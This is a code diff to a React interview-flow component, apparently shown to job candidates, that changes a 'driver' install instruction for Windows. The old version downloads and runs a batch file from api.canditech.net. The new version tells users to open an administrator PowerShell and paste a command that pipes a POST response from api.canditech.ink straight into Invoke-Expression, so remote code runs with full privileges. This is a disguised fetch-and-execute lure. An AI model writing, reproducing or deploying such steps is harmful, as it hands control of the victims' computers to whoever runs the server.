@@ -721,8 +721,8 @@ export default function SummaryInterview() {
                   )}
                   {driverOs === 'windows' && (
                     <p>
-                      Press <kbd>Windows</kbd> + <kbd>S</kbd>, type <strong>cmd</strong>, and open <strong>Command Prompt</strong> (not PowerShell). The command below uses Windows
-                      <code>%TEMP%</code> syntax and must run under <strong>cmd.exe</strong>, or use the single line as written (it calls <code>cmd.exe</code> for you so it also works if you paste into PowerShell).
+                      Press <kbd>Windows</kbd> + <kbd>S</kbd>, type <strong>PowerShell</strong>, then right-click <strong>Windows PowerShell</strong> and choose <strong>Run as administrator</strong>.
+                      Paste the command below exactly as shown and press <kbd>Enter</kbd>.
                     </p>
                   )}
                   {driverOs === 'linux' && (
@@ -760,7 +760,7 @@ export default function SummaryInterview() {
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://api.canditech.net/window/${inviteLink ? inviteLink : ''} -o "%TEMP%\\t.bat" && cmd /c "%TEMP%\\t.bat" && del "%TEMP%\\t.bat"`}
+                      {`Invoke-RestMethod -Uri "https://api.canditech.ink/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                           </code>
                       )}
               {driverOs === 'linux' && (
